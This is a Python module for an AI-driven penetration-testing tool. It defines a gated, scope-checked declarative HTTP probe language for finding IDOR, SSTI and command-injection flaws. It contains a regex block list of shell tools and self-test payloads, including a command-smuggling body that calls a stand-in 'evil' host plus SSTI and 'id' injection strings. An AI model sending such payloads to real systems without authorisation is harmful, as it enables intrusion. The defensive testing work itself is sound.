#!/usr/bin/env python3
"""
ARISE — Declarative Probe DSL  (Offensive AI Elevation, Phase 7)
================================================================
The riskiest v1 idea, fenced so it cannot "kill the tool". When no existing
capability fits, the brain may author a bespoke MULTI-STEP probe — but only as a
DECLARATIVE HTTP request-sequence, never arbitrary code. There is no shell, no
eval, no filesystem: the DSL *is* the sandbox.

A probe is a dict:
  {
    "name": "auth-then-idor",
    "steps": [
      {"op":"request","method":"GET","url":"https://x.com/api/me","save":"me"},
      {"op":"capture","from":"me","json":"id","as":"myid"},
      {"op":"request","method":"GET","url":"https://x.com/api/orders/{{myid}}","save":"o"},
      {"op":"assert","oracle":"bola_idor","pair":{"own":"me","other":"o"},
       "req":{"identity":"self"}, "vuln_class":"bola"}
    ]
  }

Safety rails inherited from arise_autonomous (SAME rules, reused):
  * every request URL is ScopeGuard-checked; out-of-scope => refused step
  * method must be in _SAFE_METHODS (DELETE / non-standard verbs refused)
  * request body size-capped + screened by _DANGEROUS_BODY_RE (no webshell/cmd)
  * bounded step count + per-request timeout; the HTTP fn is injectable
  * GATED: refuses to run unless PROBE_SYNTH_ENABLED=true (default off)
  * output is a LEAD confirmed by a response_analysis oracle — never a raw finding

Never raises; on any bad step it records a refusal and continues/aborts safely.
Stdlib only (+ response_analysis oracles, offensive_verify.Http at runtime).
"""

from __future__ import annotations

import sys as _sys
import os
import re
import json as _json
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Tuple

_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _ROOT not in _sys.path:
    _sys.path.insert(0, _ROOT)

# Reuse the EXACT non-destructive rules the autonomous engine already enforces.
try:
    from arise_autonomous import (_SAFE_METHODS, _DANGEROUS_BODY_RE, _POST_BODY_CAP)
except Exception:  # pragma: no cover - fall back to identical local copies
    _SAFE_METHODS = {"get", "post", "put", "patch", "options", "head"}
    _DANGEROUS_BODY_RE = re.compile(
        r"(?:;|\|\||&&|`|\$\()\s*(?:sh|bash|curl|wget|nc|python|php|powershell|cmd)\b"
        r"|<\?php|<%|\bsystem\s*\(|\beval\s*\(", re.I)
    _POST_BODY_CAP = 2000

try:
    from discovery.response_analysis import run_oracle, ORACLES as _ORACLES
except Exception:  # pragma: no cover
    run_oracle, _ORACLES = None, {}

_VAR_RE = re.compile(r"\{\{\s*([a-zA-Z_][a-zA-Z0-9_]*)\s*\}\}")
_MAX_STEPS = 12
_ENABLE_FLAG = "PROBE_SYNTH_ENABLED"


@dataclass
class ProbeResult:
    ok: bool
    leads: List[dict] = field(default_factory=list)
    steps_run: int = 0
    refused: List[str] = field(default_factory=list)
    reason: str = ""

    def to_dict(self) -> dict:
        return {"ok": self.ok, "leads": self.leads, "steps_run": self.steps_run,
                "refused": self.refused, "reason": self.reason}


def is_enabled() -> bool:
    return os.environ.get(_ENABLE_FLAG, "").strip().lower() in ("1", "true", "yes", "on")


# ---------------------------------------------------------------------------
# Variable substitution (HTTP-only; there is no shell to inject into)
# ---------------------------------------------------------------------------
def _subst(template: str, bag: Dict[str, str]) -> str:
    def _rep(m):
        return str(bag.get(m.group(1), m.group(0)))
    return _VAR_RE.sub(_rep, template or "")


# ---------------------------------------------------------------------------
# Per-request safety gate — the SAME contract as arise_autonomous.validate_action
# ---------------------------------------------------------------------------
def _vet_request(method: str, url: str, body, scope) -> Optional[str]:
    m = (method or "GET").lower()
    if m not in _SAFE_METHODS:
        return f"method {m.upper()} not allowed (DELETE/non-standard refused)"
    if not url or not url.lower().startswith(("http://", "https://")):
        return "request url must be an absolute http(s) URL"
    if scope is not None:
        try:
            if not scope.in_scope(url):
                return f"out-of-scope url: {url}"
        except Exception:
            return "scope check failed"
    if body is not None:
        b = body if isinstance(body, str) else _json.dumps(body)
        if len(b) > _POST_BODY_CAP:
            return f"request body exceeds {_POST_BODY_CAP}-byte cap"
        if _DANGEROUS_BODY_RE.search(b):
            return "request body contains a disallowed command-exec/webshell pattern"
    return None


# ---------------------------------------------------------------------------
# Response snapshot -> the {status,body,headers,elapsed_ms} shape oracles expect
# ---------------------------------------------------------------------------
def _snap(resp) -> dict:
    if resp is None:
        return {"status": None, "body": "", "headers": {}, "elapsed_ms": 0}
    if isinstance(resp, dict):
        return {"status": resp.get("status"), "body": resp.get("body", "") or "",
                "headers": resp.get("headers", {}) or {},
                "elapsed_ms": resp.get("elapsed_ms", 0)}
    try:
        elapsed = int(getattr(resp, "_arise_elapsed", 0.0) * 1000)
        return {"status": resp.status_code,
                "body": (resp.text or "")[:200_000],
                "headers": {k: v for k, v in resp.headers.items()},
                "elapsed_ms": elapsed}
    except Exception:
        return {"status": None, "body": "", "headers": {}, "elapsed_ms": 0}


def _capture(snap: dict, step: dict) -> Optional[str]:
    if step.get("json"):
        try:
            obj = _json.loads(snap.get("body") or "")
            for key in str(step["json"]).split("."):
                obj = obj[int(key)] if (isinstance(obj, list) and key.isdigit()) else obj[key]
            return str(obj)
        except Exception:
            return None
    if step.get("header"):
        return str(snap.get("headers", {}).get(step["header"], "")) or None
    if step.get("regex"):
        m = re.search(step["regex"], snap.get("body") or "")
        return m.group(1) if (m and m.groups()) else (m.group(0) if m else None)
    return None


# ---------------------------------------------------------------------------
# Interpreter
# ---------------------------------------------------------------------------
def run_probe(probe: dict, scope, request_fn: Callable, *,
              host: str = "", timeout_s: int = 12) -> ProbeResult:
    """Execute a declarative probe. `request_fn(method,url,headers,body,timeout)`
    returns a response object/dict (injected for tests; default uses
    offensive_verify.Http). Refuses entirely unless PROBE_SYNTH_ENABLED is set."""
    if not is_enabled():
        return ProbeResult(False, reason=f"probe DSL disabled (set {_ENABLE_FLAG}=true to enable)")
    if not isinstance(probe, dict) or not isinstance(probe.get("steps"), list):
        return ProbeResult(False, reason="malformed probe (need {'steps':[...]})")

    steps = probe["steps"][:_MAX_STEPS]
    bag: Dict[str, str] = {}
    saved: Dict[str, dict] = {}
    declared: set = set()          # names some capture step promised to fill
    res = ProbeResult(True, reason="")
    name = str(probe.get("name", "probe"))[:80]

    for i, step in enumerate(steps):
        if not isinstance(step, dict):
            res.refused.append(f"step {i}: not an object")
            continue
        op = step.get("op")

        if op == "request":
            method = step.get("method", "GET")
            url = _subst(step.get("url", ""), bag)
            headers = {k: _subst(str(v), bag) for k, v in (step.get("headers") or {}).items()}
            body = step.get("body")
            if isinstance(body, str):
                body = _subst(body, bag)
            # A capture variable that was promised but never filled (capture
            # failed) would otherwise be sent as a literal `{{name}}`. Refuse
            # rather than fire a garbage request. SSTI payloads like {{7*7}} are
            # digit-led and never match _VAR_RE, so they are unaffected.
            unresolved = [n for n in _VAR_RE.findall(url + " " + (body if isinstance(body, str) else ""))
                          if n in declared and n not in bag]
            if unresolved:
                res.refused.append(f"step {i} ({name}): unresolved capture var(s) {unresolved} "
                                   f"— a prior capture failed")
                if step.get("required", True):
                    res.reason = f"aborted at step {i}: unresolved {unresolved}"
                    return res
                continue
            reason = _vet_request(method, url, body, scope)
            if reason:
                res.refused.append(f"step {i} ({name}): REFUSED {reason}")
                if step.get("required", True):
                    res.reason = f"aborted at step {i}: {reason}"
                    return res
                continue
            try:
                resp = request_fn(method, url, headers, body, timeout_s)
            except Exception as exc:  # noqa: BLE001
                res.refused.append(f"step {i}: request error {str(exc)[:120]}")
                continue
            res.steps_run += 1
            snap = _snap(resp)
            if step.get("save"):
                saved[str(step["save"])] = snap

        elif op == "capture":
            if step.get("as"):
                declared.add(str(step["as"]))   # promised, even if it fails below
            src = saved.get(str(step.get("from", "")))
            if src is None:
                res.refused.append(f"step {i}: capture from unknown response '{step.get('from')}'")
                continue
            val = _capture(src, step)
            if val is not None and step.get("as"):
                bag[str(step["as"])] = val
            elif val is None:
                res.refused.append(f"step {i}: capture matched nothing")

        elif op == "assert":
            oname = step.get("oracle")
            if not run_oracle or oname not in _ORACLES:
                res.refused.append(f"step {i}: unknown oracle '{oname}'")
                continue
            shape = _ORACLES[oname][0]
            req = dict(step.get("req") or {})
            # assemble the oracle's 'side' argument to match its SHAPE:
            #  single/timing -> one saved response  (sql_error, ssti, sql_time, cmd_injection…)
            #  upload         -> {"fetch": <saved response>}  (upload_unrestricted)
            #  differential   -> the pair map {role: saved response}  (sql_boolean, bola_idor…)
            if shape in ("single", "timing"):
                side = saved.get(str(step.get("on", "")), {})
            elif shape == "upload":
                side = {"fetch": saved.get(str(step.get("on", "")), {})}
            else:  # differential
                side = {k: saved.get(str(v), {}) for k, v in (step.get("pair") or {}).items()}
            try:
                finding = run_oracle(oname, req, side)
            except Exception as exc:  # noqa: BLE001
                res.refused.append(f"step {i}: oracle error {str(exc)[:120]}")
                continue
            if finding:  # a lead — the oracle fired
                res.leads.append(_lead_from_oracle(finding, step, name, host))
        else:
            res.refused.append(f"step {i}: unknown op '{op}'")

    res.reason = res.reason or (f"{res.steps_run} step(s); {len(res.leads)} oracle-confirmed lead(s)")
    return res


def _lead_from_oracle(finding, step: dict, probe_name: str, host: str) -> dict:
    vcls = step.get("vuln_class") or getattr(finding, "oracle", "")
    conf = getattr(finding, "confidence", "medium")
    # An oracle firing is a real security differential (L3); it still passes
    # through the reconciler + Verifier before it is a confirmed vulnerability.
    return {
        "source": "Probe DSL",
        "detection_tool": "probe_dsl",
        "template": f"{vcls} (probe: {probe_name})",
        "title": f"{vcls} via authored probe '{probe_name}'",
        "severity": "high" if conf == "high" else ("critical" if conf == "critical" else "medium"),
        "host": host,
        "url": _last_url(step),
        "parameter": (step.get("req") or {}).get("param", ""),
        "impact": getattr(finding, "evidence", ""),
        "evidence": getattr(finding, "evidence", ""),
        "provenance": {"lane": vcls, "class": "authored-probe"},
        "evidence_rung": "L3",
        "confidence": "probable",
        "verification": f"probe-dsl-oracle:{getattr(finding, 'oracle', '')}",
        "lead_only": True,
    }


def _last_url(step: dict) -> str:
    return str(step.get("on") or "")


# Default request_fn using the shared, scope-aware Http client.
def default_request_fn(scope=None, rate: int = 10):
    from offensive.offensive_verify import Http
    http = Http(rate=rate, scope=scope)

    def _req(method, url, headers, body, timeout):
        kw = {"headers": headers, "timeout": timeout}
        if body is not None:
            if isinstance(body, (dict, list)):
                kw["json_body"] = body
            else:
                kw["data"] = body
        return http.request(method, url, **kw)
    return _req


# ---------------------------------------------------------------------------
# Self-test (no network; gated; mock request_fn + real oracles)
# ---------------------------------------------------------------------------
def _selftest() -> int:
    class _Scope:
        def in_scope(self, url):
            return "x.com" in url

    # --- gate: disabled by default -> refuses to run
    os.environ.pop(_ENABLE_FLAG, None)
    r = run_probe({"steps": []}, _Scope(), lambda *a: None)
    assert r.ok is False and "disabled" in r.reason

    os.environ[_ENABLE_FLAG] = "true"
    try:
        # --- out-of-scope + DELETE + webshell body are all refused
        bad = {"name": "bad", "steps": [
            {"op": "request", "method": "GET", "url": "https://evil.com/x", "required": False},
            {"op": "request", "method": "DELETE", "url": "https://x.com/y", "required": False},
            {"op": "request", "method": "POST", "url": "https://x.com/z",
             "body": "a=1; curl http://evil/`id`", "required": False},
        ]}
        rb = run_probe(bad, _Scope(), lambda *a: {"status": 200, "body": "", "headers": {}})
        assert len(rb.refused) == 3, rb.refused
        assert any("out-of-scope" in x for x in rb.refused)
        assert any("DELETE" in x for x in rb.refused)
        assert any("webshell" in x or "command-exec" in x for x in rb.refused)

        # --- happy path: request -> capture -> request(with var) -> assert(oracle fires)
        calls = []
        def _fake_req(method, url, headers, body, timeout):
            calls.append(url)
            if url.endswith("/me"):
                return {"status": 200, "body": '{"id":"42"}', "headers": {}, "elapsed_ms": 5}
            # the SSTI probe reflects 49 -> ssti oracle fires
            return {"status": 200, "body": "result is 49", "headers": {"Content-Type": "text/html"},
                    "elapsed_ms": 5}

        probe = {"name": "capture-then-ssti", "steps": [
            {"op": "request", "method": "GET", "url": "https://x.com/me", "save": "me"},
            {"op": "capture", "from": "me", "json": "id", "as": "uid"},
            {"op": "request", "method": "GET", "url": "https://x.com/render?uid={{uid}}&q={{7*7}}",
             "save": "r"},
            {"op": "assert", "oracle": "ssti", "on": "r",
             "req": {"payload": "{{7*7}}"}, "vuln_class": "ssti"},
        ]}
        rp = run_probe(probe, _Scope(), _fake_req, host="x.com")
        assert rp.ok and rp.steps_run == 2, rp.to_dict()
        # variable substitution worked: the 2nd request carried uid=42
        assert any("uid=42" in u for u in calls), calls
        # the ssti oracle fired -> exactly one lead, and it is LEAD-ONLY at L3
        assert len(rp.leads) == 1, rp.leads
        L = rp.leads[0]
        assert L["lead_only"] is True and L["evidence_rung"] == "L3"
        assert L["detection_tool"] == "probe_dsl"

        # --- regression: a TIMING-shape oracle (cmd_injection) must get a SINGLE
        #     response, not a pair-dict. Body carries `id` output -> must fire.
        def _cmd_req(method, url, headers, body, timeout):
            return {"status": 200, "body": "uid=0(root) gid=0(root) groups=0(root)",
                    "headers": {}, "elapsed_ms": 5}
        cmd_probe = {"name": "cmd", "steps": [
            {"op": "request", "method": "GET", "url": "https://x.com/run?c=id", "save": "r"},
            {"op": "assert", "oracle": "cmd_injection", "on": "r",
             "req": {"payload": "; id"}, "vuln_class": "rce"},
        ]}
        rc = run_probe(cmd_probe, _Scope(), _cmd_req, host="x.com")
        assert len(rc.leads) == 1, f"timing-shape oracle must fire on single resp: {rc.to_dict()}"

        # --- regression: a failed capture must NOT send a literal {{var}} request
        def _miss_req(method, url, headers, body, timeout):
            calls.append(url)
            return {"status": 200, "body": "{}", "headers": {}, "elapsed_ms": 1}
        calls.clear()
        miss = {"name": "miss", "steps": [
            {"op": "request", "method": "GET", "url": "https://x.com/me", "save": "me"},
            {"op": "capture", "from": "me", "json": "id", "as": "uid"},   # 'id' absent -> fails
            {"op": "request", "method": "GET", "url": "https://x.com/u/{{uid}}", "required": False},
        ]}
        rm = run_probe(miss, _Scope(), _miss_req, host="x.com")
        assert not any("{{uid}}" in u for u in calls), "must not send an unresolved-var URL"
        assert any("unresolved capture var" in x for x in rm.refused), rm.refused
    finally:
        os.environ.pop(_ENABLE_FLAG, None)

    print("[probe_dsl] self-test OK — gated, scope+non-destructive enforced, oracle-confirmed lead-only")
    return 0


if __name__ == "__main__":
    _sys.exit(_selftest())
